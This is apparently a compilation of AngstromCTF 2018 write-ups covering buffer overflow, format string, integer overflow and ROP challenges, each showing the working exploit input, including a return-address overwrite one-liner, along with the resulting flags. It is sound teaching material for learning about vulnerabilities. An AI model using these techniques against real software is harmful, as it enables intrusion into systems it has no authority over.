
### buffer overflow
```
AngstromCTF_2018: Cookie Jar
Category: Binary Points: 60 Description:

Note: Binary has been updated Try to break this Cookie Jar that was compiled from this source Once you've pwned the binary, 
test it out by connecting to nc shell.angstromctf.com 1234 to get the flag.

Write-up
Another simple challenge with a simpler buffer overflow,

$ nc shell.angstromctf.com 1234
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there in the cookie jar: 
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
Congrats, you have 122 cookies!
Here's your flag: actf{eat_cookies_get_buffer}
Therefore, the flag is actf{eat_cookies_get_buffer}
```

### format string
```
https://old-writeups.amosng.com/2018/angstromctf_2018/binary/number-guess_70/
AngstromCTF_2018: Number Guess
Category: Binary Points: 70 Description:

Ian loves playing number guessing games, so he went ahead and wrote one himself (source). 
I hope it doesn't have any vulns. The service is running at nc shell.angstromctf.com 1235.

Write-up
This is another simple format string challenge

# nc shell.angstromctf.com 1235
Welcome to the number guessing game!
Before we begin, please enter your name (40 chars max): 
%3$d %9$d
I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
746589 509197's guess: 1255786
Congrats, here's a flag: actf{format_stringz_are_pre77y_sc4ry}
Therefore, the flag is actf{format_stringz_are_pre77y_sc4ry}.

```

### integer overflow 
 
 ```
 https://old-writeups.amosng.com/2018/angstromctf_2018/binary/accumulator_50/accumulator.c
 
AngstromCTF_2018: Accumulator
Category: Binary Points: 50 Description:

I found this program (source) that lets me add positive numbers to a variable, but it won't give me a flag unless that variable is negative! Can you help me out? Navigate to /problems/accumulator/ on the shell server to try your exploit out!

Write-up
This is a simple integer overflow challenge, with 32-bit integers.

$ ./accumulator64
The accumulator currently has a value of 0.
Please enter a positive integer to add: 2147483647
The accumulator currently has a value of 2147483647.
Please enter a positive integer to add: 1
The accumulator has a value of -2147483648. You win!
actf{signed_ints_aint_safe}
Therefore, the flag is actf{signed_ints_aint_safe}.



#include <stdlib.h>
#include <stdio.h>

int main(){

	int accumulator = 0;
	int n;
	while (accumulator >= 0){
		printf("The accumulator currently has a value of %d.\n",accumulator);
		printf("Please enter a positive integer to add: ");

		if (scanf("%d",&n) != 1){
			printf("Error reading integer.\n");
		} else {
			if (n < 0){
				printf("You can't enter negatives!\n");
			} else {
				accumulator += n;
			}
		}
	}
	gid_t gid = getegid();
	setresgid(gid,gid,gid);
	
	printf("The accumulator has a value of %d. You win!\n", accumulator);
	system("/bin/cat flag");

}
```
### ROP

```
AngstromCTF_2018: Rop To The Top
Category: Binary Points: 130 Description:

Rop, rop, rop Rop to the top! Slip and slide and ride that rhythm... Here's some binary and source. Navigate to/problems/roptothetop/ on the shell server to try your exploit out!

Write-up
Relatively simple challenge too, with a simple ROP exploit code.

# r2 rop_to_the_top32
r_config_set: variable 'asm.cmtright' not found
 -- To debug a program, you can call r2 with 'dbg://<path-to-program>' or '-d <path..>'
[0x080483e0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)

[0x080483e0]> is
[Symbols]
[...]
060 0x00001028 0x0804a028 GLOBAL OBJECT    0 __dso_handle
061 0x0000061c 0x0804861c GLOBAL OBJECT    4 _IO_stdin_used
063 0x000005a0 0x080485a0 GLOBAL   FUNC   93 __libc_csu_init
064 0x0804a030 0x0804a030 GLOBAL NOTYPE    0 _end
065 0x000003e0 0x080483e0 GLOBAL   FUNC    0 _start
066 0x000004db 0x080484db GLOBAL   FUNC   25 the_top
067 0x00000618 0x08048618 GLOBAL OBJECT    4 _fp_hw
[...]
With the address of the_top(), we can now craft our exploit.

$ ./rop_to_the_top32 `python -c "print('A' * 44 + '\xdb\x84\x04\x08')"`
Now copying input...
Done!
actf{strut_your_stuff}
Therefore, the flag is actf{strut_your_stuff}.
```

